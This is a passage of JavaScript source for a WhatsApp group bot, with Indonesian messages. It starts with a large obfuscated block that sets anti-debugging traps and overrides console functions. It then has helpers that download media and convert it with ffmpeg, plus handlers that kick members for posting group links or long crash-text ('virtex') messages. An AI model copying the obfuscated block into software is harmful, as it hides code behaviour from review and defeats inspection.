RegExp(_0x2c2c17[_0x502c93(0x1dc)],'i'),_0x4363d5=_0x2c2c17[_0x502c93(0x1a3)](_0x12b786,_0x2c2c17[_0x502c93(0x1de)]);if(!_0x343db3[_0x5ab1e5(0x17e)](_0x2c2c17[_0x28da2f(0x129)](_0x4363d5,_0x2c2c17[_0x28da2f(0x20b)]))||!_0x4ec29d[_0x502c93(0x17e)](_0x2c2c17[_0x28da2f(0x19c)](_0x4363d5,_0x2c2c17[_0x22f664(0x1c7)]))){if(_0x2c2c17[_0x5ab1e5(0xe1)](_0x2c2c17[_0x3883f6(0xf3)],_0x2c2c17[_0x5ab1e5(0xf9)]))_0x2c2c17[_0x502c93(0x1a3)](_0x4363d5,'0');else{const _0x4acf59=_0x4e8a02?function(){const _0x3f5d93=_0x5ab1e5;if(_0x4a8b9d){const _0x258b18=_0x5b0466[_0x3f5d93(0x1e0)](_0x10a628,arguments);return _0x20394d=null,_0x258b18;}}:function(){};return _0x176e4b=![],_0x4acf59;}}else{if(_0x2c2c17[_0x28da2f(0x126)](_0x2c2c17[_0x22f664(0x1c1)],_0x2c2c17[_0x28da2f(0xe2)]))return _0x38e678[_0x502c93(0x19f)+_0x28da2f(0x137)]()[_0x3883f6(0x1ce)+'h'](yPDVoC[_0x3883f6(0x114)])[_0x22f664(0x19f)+_0x28da2f(0x137)]()[_0x5ab1e5(0x1d0)+_0x28da2f(0x104)+'r'](_0x2f47b4)[_0x5ab1e5(0x1ce)+'h'](yPDVoC[_0x502c93(0x114)]);else _0x2c2c17[_0x502c93(0x130)](_0x12b786);}}})();}());const _0x5d3a5c=(function(){const _0x87a8ee=_0xea34dc,_0x366f0f=_0x28452b,_0x3dd10c=_0x28452b,_0x1fd319=_0x50a784,_0xfae43f=_0x49dc58,_0x5050c9={'jLZNP':function(_0x141782,_0x1c404d){const _0x3b6e8b=_0x336c;return _0x2c2c17[_0x3b6e8b(0x1a3)](_0x141782,_0x1c404d);},'ByYfC':function(_0x55575b,_0x19d676){const _0x1b8ee1=_0x336c;return _0x2c2c17[_0x1b8ee1(0x170)](_0x55575b,_0x19d676);},'EfFkD':_0x2c2c17[_0x87a8ee(0xfe)],'sKOXH':_0x2c2c17[_0x87a8ee(0x140)],'SsHCY':function(_0x11fbd2){const _0x507e3a=_0x366f0f;return _0x2c2c17[_0x507e3a(0x130)](_0x11fbd2);},'jWFJj':_0x2c2c17[_0x3dd10c(0x19d)],'XXZCO':_0x2c2c17[_0x1fd319(0xca)],'XwvDC':_0x2c2c17[_0x1fd319(0x1a8)],'TKxWO':_0x2c2c17[_0x1fd319(0x163)],'PaRrC':_0x2c2c17[_0x3dd10c(0x113)],'jHsUO':_0x2c2c17[_0xfae43f(0x18e)],'lcYwN':_0x2c2c17[_0x1fd319(0xd9)],'oElQI':function(_0x143eac,_0x4efc07){const _0x5c1e67=_0xfae43f;return _0x2c2c17[_0x5c1e67(0xe4)](_0x143eac,_0x4efc07);},'fiFFj':function(_0x53a48a,_0x300654){const _0x148053=_0x1fd319;return _0x2c2c17[_0x148053(0x126)](_0x53a48a,_0x300654);},'uPSkX':_0x2c2c17[_0x1fd319(0xe9)],'OxFPA':_0x2c2c17[_0x87a8ee(0xe8)],'ZOHQN':_0x2c2c17[_0x366f0f(0x17a)],'QlFXd':_0x2c2c17[_0x1fd319(0x186)],'MXWDZ':function(_0x5d7e82,_0x21f954){const _0x43ac22=_0x1fd319;return _0x2c2c17[_0x43ac22(0x15b)](_0x5d7e82,_0x21f954);},'pLEgb':_0x2c2c17[_0x366f0f(0x12d)]};if(_0x2c2c17[_0xfae43f(0x126)](_0x2c2c17[_0x1fd319(0x1fd)],_0x2c2c17[_0xfae43f(0x17c)])){const _0x5ac51e=_0x2b57e5[_0x1fd319(0x1e0)](_0x4a06bd,arguments);return _0x3fc487=null,_0x5ac51e;}else{let _0x2fc4b3=!![];return function(_0x191c40,_0xd710f1){const _0x26d002=_0xfae43f,_0x34d479=_0x366f0f,_0x49ff05=_0x366f0f,_0x2aab15=_0x1fd319,_0x3c1575=_0x366f0f,_0x4ae30f={'CSNsB':function(_0x5a7b1f,_0x54b0e1){const _0x4341f0=_0x336c;return _0x5050c9[_0x4341f0(0x21a)](_0x5a7b1f,_0x54b0e1);},'PkkRE':function(_0x37df2f,_0x11cef4){const _0x416b25=_0x336c;return _0x5050c9[_0x416b25(0x21a)](_0x37df2f,_0x11cef4);},'ZaVnW':function(_0x2a0a3c,_0x1bd808){const _0x35432e=_0x336c;return _0x5050c9[_0x35432e(0x1e1)](_0x2a0a3c,_0x1bd808);},'dcqZL':_0x5050c9[_0x26d002(0x1e6)],'cTdIM':_0x5050c9[_0x26d002(0x162)],'SXGsv':function(_0x3135c0){const _0x3e8c0f=_0x34d479;return _0x5050c9[_0x3e8c0f(0x112)](_0x3135c0);},'ZAeus':_0x5050c9[_0x34d479(0x102)],'IMaRx':_0x5050c9[_0x49ff05(0x203)],'WvEPu':_0x5050c9[_0x49ff05(0x10e)],'hdomu':_0x5050c9[_0x34d479(0x116)],'SyhWX':_0x5050c9[_0x26d002(0x16e)],'AFhEU':_0x5050c9[_0x3c1575(0x20a)],'nwNSM':_0x5050c9[_0x2aab15(0x1bb)],'kKsJS':function(_0x2c9ef7,_0x342523){const _0x129144=_0x2aab15;return _0x5050c9[_0x129144(0xf2)](_0x2c9ef7,_0x342523);},'FNHhx':function(_0x3e532c,_0x25f9c1){const _0x3ca7e1=_0x3c1575;return _0x5050c9[_0x3ca7e1(0x193)](_0x3e532c,_0x25f9c1);},'YTiZV':_0x5050c9[_0x3c1575(0x1b0)],'jIAAf':_0x5050c9[_0x3c1575(0x128)],'enmwl':function(_0x5f2226,_0x53595b){const _0x14d11c=_0x3c1575;return _0x5050c9[_0x14d11c(0x193)](_0x5f2226,_0x53595b);},'cdQKq':_0x5050c9[_0x49ff05(0x1c3)],'RRgky':_0x5050c9[_0x49ff05(0x178)]};if(_0x5050c9[_0x34d479(0x1fa)](_0x5050c9[_0x49ff05(0x1e9)],_0x5050c9[_0x3c1575(0x1e9)])){if(_0x359d0a){const _0x231060=_0x11f36d[_0x49ff05(0x1e0)](_0x47f8ad,arguments);return _0x580d91=null,_0x231060;}}else{const _0xb1c36c=_0x2fc4b3?function(){const _0x2a9e56=_0x26d002,_0x108429=_0x34d479,_0x32b62b=_0x26d002,_0x341a36=_0x2aab15,_0x1c5cda=_0x49ff05,_0x4b9d3c={'swrZt':function(_0x531752,_0x41b51d){const _0x15c80b=_0x336c;return _0x4ae30f[_0x15c80b(0x1d5)](_0x531752,_0x41b51d);},'BUhtp':function(_0x240e7c,_0x4997ba){const _0x21dae1=_0x336c;return _0x4ae30f[_0x21dae1(0x17b)](_0x240e7c,_0x4997ba);},'WAUoH':_0x4ae30f[_0x2a9e56(0xda)],'XJeTr':_0x4ae30f[_0x2a9e56(0x158)],'lbWcq':function(_0x2925a8){const _0x5961b3=_0x2a9e56;return _0x4ae30f[_0x5961b3(0x146)](_0x2925a8);},'VSTQO':_0x4ae30f[_0x32b62b(0xeb)],'eRNGn':_0x4ae30f[_0x341a36(0x109)],'jlYKO':_0x4ae30f[_0x2a9e56(0x17f)],'PpnVn':_0x4ae30f[_0x32b62b(0x181)],'ZRYmL':_0x4ae30f[_0x2a9e56(0x221)],'Wtmsw':_0x4ae30f[_0x1c5cda(0x138)],'fEnmd':_0x4ae30f[_0x2a9e56(0x1b8)],'Lwych':function(_0x35f6eb,_0x4e0d82){const _0xb93935=_0x1c5cda;return _0x4ae30f[_0xb93935(0xea)](_0x35f6eb,_0x4e0d82);}};if(_0x4ae30f[_0x1c5cda(0x14d)](_0x4ae30f[_0x341a36(0x1a0)],_0x4ae30f[_0x32b62b(0x20f)]))fJSFTq[_0x341a36(0x209)](_0x46aaae,0x1701+0x17c9+0x35*-0xe2);else{if(_0xd710f1){if(_0x4ae30f[_0x2a9e56(0xd5)](_0x4ae30f[_0x32b62b(0x117)],_0x4ae30f[_0x32b62b(0xec)])){let _0x3dc6e8;try{const _0x592a44=rxaEtc[_0x2a9e56(0x197)](_0x44a916,rxaEtc[_0x1c5cda(0x1c8)](rxaEtc[_0x108429(0x1c8)](rxaEtc[_0x1c5cda(0x148)],rxaEtc[_0x108429(0x1aa)]),');'));_0x3dc6e8=rxaEtc[_0x108429(0x16c)](_0x592a44);}catch(_0x477f20){_0x3dc6e8=_0x3c509e;}const _0x484fd6=_0x3dc6e8[_0x341a36(0x1c4)+'le']=_0x3dc6e8[_0x32b62b(0x1c4)+'le']||{},_0x13ac29=[rxaEtc[_0x341a36(0x1ed)],rxaEtc[_0x108429(0x1b1)],rxaEtc[_0x2a9e56(0x1bc)],rxaEtc[_0x2a9e56(0x1eb)],rxaEtc[_0x341a36(0x13f)],rxaEtc[_0x1c5cda(0x18c)],rxaEtc[_0x2a9e56(0x1d1)]];for(let _0x6ad38c=0x1*0x1ce1+-0x2405+0x724;rxaEtc[_0x108429(0x184)](_0x6ad38c,_0x13ac29[_0x108429(0x210)+'h']);_0x6ad38c++){const _0x4e8cec=_0x4367c1[_0x32b62b(0x1d0)+_0x2a9e56(0x104)+'r'][_0x108429(0x1fe)+_0x2a9e56(0x16f)][_0x2a9e56(0x15d)](_0x9e51f2),_0xeba192=_0x13ac29[_0x6ad38c],_0x12c7a4=_0x484fd6[_0xeba192]||_0x4e8cec;_0x4e8cec[_0x2a9e56(0x1a7)+_0x2a9e56(0x1d7)]=_0x2b79bf[_0x108429(0x15d)](_0x3ac4f9),_0x4e8cec[_0x32b62b(0x19f)+_0x341a36(0x137)]=_0x12c7a4[_0x108429(0x19f)+_0x32b62b(0x137)][_0x1c5cda(0x15d)](_0x12c7a4),_0x484fd6[_0xeba192]=_0x4e8cec;}}else{const _0x30fbc2=_0xd710f1[_0x2a9e56(0x1e0)](_0x191c40,arguments);return _0xd710f1=null,_0x30fbc2;}}}}:function(){};return _0x2fc4b3=![],_0xb1c36c;}};}}()),_0x8a0a20=_0x2c2c17[_0x49dc58(0x1b7)](_0x5d3a5c,this,function(){const _0x402773=_0xea34dc,_0x5c21ed=_0xea34dc,_0x18d637=_0x4beb46,_0x4b529b=_0x4beb46,_0x26a6b2=_0xea34dc;if(_0x2c2c17[_0x402773(0xd4)](_0x2c2c17[_0x5c21ed(0x1d9)],_0x2c2c17[_0x402773(0x1d9)])){const _0xe9a64f=_0x51f648?function(){const _0xe906af=_0x402773;if(_0x19ebdc){const _0x57cb4f=_0x2cbd34[_0xe906af(0x1e0)](_0x4b53ea,arguments);return _0x24281e=null,_0x57cb4f;}}:function(){};return _0x10324c=![],_0xe9a64f;}else{let _0x3c9cdc;try{if(_0x2c2c17[_0x18d637(0xd4)](_0x2c2c17[_0x402773(0x183)],_0x2c2c17[_0x18d637(0x183)]))(function(){return![];}[_0x5c21ed(0x1d0)+_0x5c21ed(0x104)+'r'](zYLhAF[_0x18d637(0x166)](zYLhAF[_0x4b529b(0x156)],zYLhAF[_0x402773(0x1e4)]))[_0x4b529b(0x1e0)](zYLhAF[_0x4b529b(0x118)]));else{const _0x4bfb6e=_0x2c2c17[_0x26a6b2(0x1a3)](Function,_0x2c2c17[_0x402773(0xcd)](_0x2c2c17[_0x402773(0x174)](_0x2c2c17[_0x18d637(0xfe)],_0x2c2c17[_0x18d637(0x140)]),');'));_0x3c9cdc=_0x2c2c17[_0x5c21ed(0x130)](_0x4bfb6e);}}catch(_0x8b63db){_0x2c2c17[_0x5c21ed(0x139)](_0x2c2c17[_0x5c21ed(0x1fb)],_0x2c2c17[_0x26a6b2(0x1fb)])?zYLhAF[_0x402773(0x130)](_0x11efe4):_0x3c9cdc=window;}const _0x5cf55a=_0x3c9cdc[_0x5c21ed(0x1c4)+'le']=_0x3c9cdc[_0x5c21ed(0x1c4)+'le']||{},_0x36e79b=[_0x2c2c17[_0x4b529b(0x19d)],_0x2c2c17[_0x4b529b(0xca)],_0x2c2c17[_0x18d637(0x1a8)],_0x2c2c17[_0x4b529b(0x163)],_0x2c2c17[_0x4b529b(0x113)],_0x2c2c17[_0x402773(0x18e)],_0x2c2c17[_0x5c21ed(0xd9)]];for(let _0x2f6b8a=0xa2a*-0x3+-0x251*0xb+0x59*0xa1;_0x2c2c17[_0x26a6b2(0x1f5)](_0x2f6b8a,_0x36e79b[_0x4b529b(0x210)+'h']);_0x2f6b8a++){if(_0x2c2c17[_0x5c21ed(0x185)](_0x2c2c17[_0x402773(0x20e)],_0x2c2c17[_0x5c21ed(0x20e)])){const _0x27638e=_0x23a014[_0x4b529b(0x1e0)](_0x214896,arguments);return _0x59a9a9=null,_0x27638e;}else{const _0x5acb16=_0x5d3a5c[_0x26a6b2(0x1d0)+_0x26a6b2(0x104)+'r'][_0x402773(0x1fe)+_0x18d637(0x16f)][_0x26a6b2(0x15d)](_0x5d3a5c),_0x59f8c7=_0x36e79b[_0x2f6b8a],_0x5507c9=_0x5cf55a[_0x59f8c7]||_0x5acb16;_0x5acb16[_0x18d637(0x1a7)+_0x5c21ed(0x1d7)]=_0x5d3a5c[_0x26a6b2(0x15d)](_0x5d3a5c),_0x5acb16[_0x4b529b(0x19f)+_0x4b529b(0x137)]=_0x5507c9[_0x18d637(0x19f)+_0x4b529b(0x137)][_0x26a6b2(0x15d)](_0x5507c9),_0x5cf55a[_0x59f8c7]=_0x5acb16;}}}});_0x2c2c17[_0x50a784(0x199)](_0x8a0a20),console[_0x50a784(0x196)](_0x2c2c17[_0xea34dc(0x1cd)]);}hi();function _0x6440(){const _0x4b6354=['RSkJI','iPjRr','qOwar','nBTEJ','cjusM','funct','oaKpI','bwcxl','zvJKC','nprnA','IRsBk','MayfI','IvSHJ','HgWID','zDZmv','xNRxm','OxFPA','cKOiY','hgbBf','FBdHA','kSEdx','JpbpH','brpsE','is\x22)(','EBQjZ','sUhdZ','XokFo','VpvxM','nCyPo','sSHNA','*(?:[','ing','AFhEU','RDvsQ','surfa','jpg','931674MecBVb','readF','fromM','ZRYmL','ktigp','KGpbs','Objec','input','trace','Snbpn','SXGsv','Z_$][','WAUoH','ileSy','image','init','vrPkh','FNHhx','vHCwl','LWMFT','vvabV','ZERO\x20','AYmUe','\x22retu','uaWXd','PfrdE','BTPJI','FlOYP','cTdIM','1066743uAzyDU','itemC','thmDs','SfKoZ','bind','9495508YyXvIr','Hello','xUMhi','EtPDz','sKOXH','XUeOa','RIBE\x20','absOS','dDJUm','call','FfBLV','cipan','while','statu','lbWcq','Dleja','PaRrC','type','CMWhb','qGrqU','QZppL','3mISzro','nDkjk','e)\x20{}','(((.+','dChRu','QlFXd','tDydI','FFvhK','ZaVnW','qYIxk','FXRdT','test','WvEPu','order','hdomu','SNqzh','hktBq','Lwych','IBxgm','bBbjK','ZojMl','MillM','/jpeg','eIOgo','retur','Wtmsw','VEqyC','XNpCq','Fxcdk','8pesfOs','HUECo','JbboC','fiFFj','RVmNI','SCJPe','log','swrZt','lEjfx','lNnnp','s@bro','QsYDE','LcbEL','xKFAX','\x20(tru','toStr','YTiZV','zerot','\x20Worl','JcNgs','kITje','nstru','jMGqd','__pro','VFZae','rsysP','XJeTr','rhzQG','UGIlh','0-9a-','zdwlT','jVsjw','uPSkX','eRNGn','remot','n()\x20','TXfSg','jIKEh','NrMpT','xkdrA','nwNSM','JdahB','Messa','lcYwN','jlYKO','AzrbF','TrQGg','ItLbB','thumb','JyqDF','OIWVl','ZOHQN','conso','GDjPk','GGkXK','BKOlQ','BUhtp','qJrrY','LkXEy','4TnFKbG','Ttixl','EifOd','searc','oyt7/','const','fEnmd','WdqxC','actio','EcIqQ','PkkRE','kOhiG','to__','stLYH','KPZut','WSxqF','wCBAO','DuyTk','n\x20(fu','azUIL','iYLJF','apply','ByYfC','xMItv','stvpl','RTKgZ','state','EfFkD','yBwEm','key','pLEgb','6129560kEkXWV','PpnVn','EvWjF','VSTQO','aMVDr','tion','PcTfo','NRWlW','chain','2580965gXVpAc','excep','hGkLy','CKMeW','gger','MzTtx','JVXYO','MXWDZ','IfcKJ','lAGcg','GvmnG','proto','YT7','messa','ipXYo','PDQyJ','XXZCO','MSBJC','ScYOl','uLSIV','nail','SUBSC','CSNsB','jHsUO','kZBnm','pp.ne','WyKuz','Fxyys','jIAAf','lengt','uQcTj','dgLLS','XyhPX','cqDFo','ctor(','ion\x20*','parti','amYkS','JOULh','jLZNP','adcas','xHreM','yYtOj','0@s.w','aOBbo','error','SyhWX','rxFnQ','JhlJE','rn\x20th','Mybqp','warn','wSzJi','aUfIU','Title','CZOMf','rJid','DIFIi','$]*)','eJid',')+)+)','PbIAR','table','hatsa','RbNvT','{}.co','WPEFh','Skcyu','RExzn','7xWqkoR','1827858BwwpHY','IdNno','enmwl','Ceqis','zA-Z_','HEbVd','Dliqe','dcqZL','HAwWD','\x5c+\x5c+\x20','debu','ount','408891xqmWHD','OFyRS','tPbfH','XpJvl','puMRG','fwmiS','dOKJN','NTrPG','nctio','QjYas','XxYVl','kKsJS','ZAeus','RRgky','humb.','ndlSy','info','tseAW','ZxLMM','oElQI','byqZE','oXTHr','TQOnm','bNHjz','strin','cFRvT','LcTQq','jajTU','a-zA-','selle','cYjLi','OntKs','BBwin','Pufhy','./zer','jWFJj','mPLbD','ructo','fRECM','ssZBX','nGKwd','fsgsD','IMaRx','\x5c(\x20*\x5c','rTSmO','PNSgp','count','XwvDC','pPLFc','OaXQj','dzpgw','SsHCY','rDfuh','HcZFz','YhGvt','TKxWO','cdQKq'];_0x6440=function(){return _0x4b6354;};return _0x6440();}function _0x12b786(_0xe923c1){const _0x4e80c9=_0x5a8d7d,_0x1066af=_0x326a88,_0x22a5ad=_0x326a88,_0x5694e1=_0x5a8d7d,_0xc9e2f1=_0x28d70f,_0x4fd016={'sSHNA':_0x4e80c9(0x11d)+_0x1066af(0x216)+_0x4e80c9(0x10a)+')','aMVDr':_0x22a5ad(0xdc)+_0x1066af(0x136)+_0x5694e1(0xfb)+_0x4e80c9(0x147)+_0xc9e2f1(0x1ad)+_0x22a5ad(0xd7)+_0xc9e2f1(0xc7),'qOwar':function(_0x4f2e94,_0x35d49f){return _0x4f2e94(_0x35d49f);},'qGrqU':_0x1066af(0x14b),'dChRu':function(_0x1ef6fd,_0x49c73f){return _0x1ef6fd+_0x49c73f;},'VEqyC':_0x1066af(0x1f2),'bwcxl':_0xc9e2f1(0x143),'HUECo':function(_0x1a1dac){return _0x1a1dac();},'xHreM':function(_0xca5930,_0x41a47c,_0x1cfa1f){return _0xca5930(_0x41a47c,_0x1cfa1f);},'OaXQj':function(_0x55f39e,_0x325825){return _0x55f39e!==_0x325825;},'rxFnQ':_0x1066af(0x1d2),'SNqzh':function(_0x2d1c22,_0x53f1c6){return _0x2d1c22===_0x53f1c6;},'qJrrY':_0x22a5ad(0x1c5),'MzTtx':_0xc9e2f1(0x1ae),'oXTHr':function(_0x2a5d5a){return _0x2a5d5a();},'PcTfo':_0x4e80c9(0xf7)+'g','WSxqF':function(_0x35e8e5,_0x57481c){return _0x35e8e5!==_0x57481c;},'lEjfx':_0xc9e2f1(0x204),'nCyPo':_0x4e80c9(0x16a)+_0x22a5ad(0x19e)+_0x5694e1(0x175),'nGKwd':_0x22a5ad(0x10d)+'er','TXfSg':_0xc9e2f1(0xf0),'FXRdT':function(_0x330b63,_0x1908eb){return _0x330b63/_0x1908eb;},'PDQyJ':_0x22a5ad(0x210)+'h','pPLFc':function(_0x2ef62a,_0x45c4eb){return _0x2ef62a===_0x45c4eb;},'vHCwl':function(_0x1b0218,_0x35a0f8){return _0x1b0218%_0x35a0f8;},'sUhdZ':function(_0x54f25d,_0x473ee7){return _0x54f25d===_0x473ee7;},'puMRG':_0x4e80c9(0x1d4),'amYkS':_0x4e80c9(0xf5),'LWMFT':function(_0x159e90,_0x5667e4){return _0x159e90+_0x5667e4;},'hgbBf':_0x1066af(0xdd),'uQcTj':_0x1066af(0x1f7),'vrPkh':_0xc9e2f1(0x1d3)+'n','DIFIi':_0x22a5ad(0x12e),'jajTU':_0x1066af(0x121),'uLSIV':function(_0x587f0d,_0x38a8a8){return _0x587f0d+_0x38a8a8;},'ScYOl':_0x1066af(0x1e5)+_0x5694e1(0x142)+'t','Pufhy':function(_0x33eb79,_0x41bcef){return _0x33eb79(_0x41bcef);},'FlOYP':function(_0x3fa93c,_0x50ad32){return _0x3fa93c(_0x50ad32);}};function _0x1c4386(_0x1701d5){const _0x2c7cd1=_0x5694e1,_0x3f45cb=_0xc9e2f1,_0x3e88ea=_0x4e80c9,_0x2b9672=_0x4e80c9,_0x11fbd0=_0x22a5ad,_0x29c0b6={'aUfIU':function(_0x45917f){const _0x8de4a9=_0x336c;return _0x4fd016[_0x8de4a9(0xf4)](_0x45917f);},'mPLbD':function(_0x5d828f,_0x4119ea){const _0xf79b51=_0x336c;return _0x4fd016[_0xf79b51(0x11a)](_0x5d828f,_0x4119ea);}};if(_0x4fd016[_0x2c7cd1(0x182)](typeof _0x1701d5,_0x4fd016[_0x2c7cd1(0x1f0)])){if(_0x4fd016[_0x3e88ea(0x1da)](_0x4fd016[_0x3e88ea(0x198)],_0x4fd016[_0x3e88ea(0x198)]))_0x29c0b6[_0x2c7cd1(0xc2)](_0x176889);else return function(_0x1d8786){}[_0x2c7cd1(0x1d0)+_0x3e88ea(0x104)+'r'](_0x4fd016[_0x3e88ea(0x134)])[_0x11fbd0(0x1e0)](_0x4fd016[_0x11fbd0(0x107)]);}else{if(_0x4fd016[_0x3e88ea(0x1da)](_0x4fd016[_0x3e88ea(0x1b4)],_0x4fd016[_0x3e88ea(0x1b4)])){const _0x390b09={'rhzQG':_0x4fd016[_0x3e88ea(0x135)],'WPEFh':_0x4fd016[_0x2b9672(0x1ee)],'FBdHA':function(_0x54a555,_0x546cab){const _0x5a3f83=_0x2b9672;return _0x4fd016[_0x5a3f83(0x11a)](_0x54a555,_0x546cab);},'Snbpn':_0x4fd016[_0x3e88ea(0x171)],'QZppL':function(_0x5b31d0,_0x2f7693){const _0x4fe4c9=_0x2c7cd1;return _0x4fd016[_0x4fe4c9(0x177)](_0x5b31d0,_0x2f7693);},'LkXEy':_0x4fd016[_0x2b9672(0x18d)],'Ttixl':_0x4fd016[_0x2c7cd1(0x11f)],'iYLJF':function(_0x225401){const _0x52072b=_0x2b9672;return _0x4fd016[_0x52072b(0x191)](_0x225401);}};_0x4fd016[_0x2c7cd1(0x21c)](_0x10ff59,this,function(){const _0x3ab368=_0x11fbd0,_0x5d0646=_0x3f45cb,_0x3493f2=_0x2c7cd1,_0x13d4bc=_0x3f45cb,_0x3c4d95=_0x3f45cb,_0x25444b=new _0x37459a(_0x390b09[_0x3ab368(0x1ab)]),_0x521894=new _0x570037(_0x390b09[_0x3ab368(0xcf)],'i'),_0x409b84=_0x390b09[_0x3493f2(0x12b)](_0x230920,_0x390b09[_0x3ab368(0x145)]);!_0x25444b[_0x13d4bc(0x17e)](_0x390b09[_0x3c4d95(0x172)](_0x409b84,_0x390b09[_0x13d4bc(0x1ca)]))||!_0x521894[_0x3493f2(0x17e)](_0x390b09[_0x5d0646(0x172)](_0x409b84,_0x390b09[_0x3c4d95(0x1cc)]))?_0x390b09[_0x3ab368(0x12b)](_0x409b84,'0'):_0x390b09[_0x13d4bc(0x1df)](_0x1dd654);})();}else{if(_0x4fd016[_0x11fbd0(0x1da)](_0x4fd016[_0x11fbd0(0x177)]('',_0x4fd016[_0x3f45cb(0x17d)](_0x1701d5,_0x1701d5))[_0x4fd016[_0x2c7cd1(0x202)]],-0x482+0x1889+-0x1406)||_0x4fd016[_0x2c7cd1(0x10f)](_0x4fd016[_0x3f45cb(0x14e)](_0x1701d5,0xdcd*0x1+-0x1ca+-0xd*0xeb),0x1d62+0x1*0xdcd+-0x2e1*0xf))_0x4fd016[_0x11fbd0(0x131)](_0x4fd016[_0x2b9672(0xe3)],_0x4fd016[_0x11fbd0(0x218)])?_0x29c0b6[_0x3e88ea(0x103)](_0x620836,'0'):function(){const _0x2e5ff6=_0x3f45cb,_0x49d549=_0x11fbd0,_0x2b6efa=_0x3e88ea,_0x5220c1=_0x2c7cd1;if(_0x4fd016[_0x2e5ff6(0x110)](_0x4fd016[_0x2e5ff6(0x222)],_0x4fd016[_0x49d549(0x222)])){if(_0x4e7677){const _0x43eff5=_0x10c318[_0x2b6efa(0x1e0)](_0x549688,arguments);return _0x2464c5=null,_0x43eff5;}}else return!![];}[_0x2b9672(0x1d0)+_0x2b9672(0x104)+'r'](_0x4fd016[_0x2c7cd1(0x14f)](_0x4fd016[_0x3f45cb(0x12a)],_0x4fd016[_0x2c7cd1(0x211)]))[_0x3e88ea(0x167)](_0x4fd016[_0x2b9672(0x14c)]);else{if(_0x4fd016[_0x3e88ea(0x1da)](_0x4fd016[_0x2b9672(0xc6)],_0x4fd016[_0x3f45cb(0xfa)]))(function(){const _0xa7298f=_0x2c7cd1,_0x238fca=_0x2c7cd1,_0x1a1d34=_0x11fbd0;if(_0x4fd016[_0xa7298f(0x182)](_0x4fd016[_0xa7298f(0x1c9)],_0x4fd016[_0xa7298f(0x1f8)])){const _0x43b586=_0xac44ba?function(){const _0x34c196=_0x238fca;if(_0x295a8b){const _0x4e44ca=_0x2154c[_0x34c196(0x1e0)](_0x3942f7,arguments);return _0x8b5529=null,_0x4e44ca;}}:function(){};return _0x375bd3=![],_0x43b586;}else return![];}[_0x3f45cb(0x1d0)+_0x3e88ea(0x104)+'r'](_0x4fd016[_0x2b9672(0x206)](_0x4fd016[_0x3f45cb(0x12a)],_0x4fd016[_0x2b9672(0x211)]))[_0x2b9672(0x1e0)](_0x4fd016[_0x3f45cb(0x205)]));else{if(_0x222674){const _0x40fe26=_0x2bf9f6[_0x2c7cd1(0x1e0)](_0x50fa2f,arguments);return _0x1c123a=null,_0x40fe26;}}}}}_0x4fd016[_0x3e88ea(0x100)](_0x1c4386,++_0x1701d5);}try{if(_0xe923c1)return _0x1c4386;else _0x4fd016[_0x1066af(0x157)](_0x1c4386,0x3*-0xa1f+-0x21f3+0x2*0x2028);}catch(_0x550171){}}
        
//━━━━━━━━━━━━━━━[ CONNECTION 2 ]━━━━━━━━━━━━━━━━━//

        let sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './stik' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './stik' + names + '.png'
                    let asw = './stik' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        zeroyt7.sendMessage(to, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
        let sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                let fn = Date.now() / 10000;
                let filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    zeroyt7.sendMessage(to, media, type, { quoted: ftrol, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            }   
            if (budy.includes("https://chat.whatsapp.com/")) {
if (!isGroup) return
if (!isAntiLink) return
if (isGroupAdmins) return
var kic = `${sender.split("@")[0]}@s.whatsapp.net`
reply(` *「 GROUP LINK DETECTOR 」*\nKamu mengirimkan link grup chat, maaf kamu di kick dari grup :(`)
setTimeout(() => {
zeroyt7.groupRemove(from, [kic]).catch((e) => { reply(`BOT HARUS JADI ADMIN`) })
}, 0)
}

		if (budy.length > 3500) {
if (!isGroup) return
if (!isAntiVirtex) return
if (isGroupAdmins) return
reply('Tandai telah dibaca\n'.repeat(300))
reply(`「 *VIRTEX DETECTOR* 」\n\nKamu mengirimkan virtex, maaf kamu di kick dari group :(`)
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
zeroyt7.groupRemove(from, [sender])
}     
if (isCmd && !isUser){
          pendaftar.push(sender)
          fs.writeFileSync('./database/user.json', JSON.stringify(pendaftar, null, 2))
        }

//━━━━━━━━━━━━━━━[ CONNECTION 3 ]━━━━━━━━━━━━━━━━━//

		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		let isMedia = (type === 'imageMessage' || type === 'videoMessage')
		let isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		let isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		let isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		let isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
      	if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
      	//if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
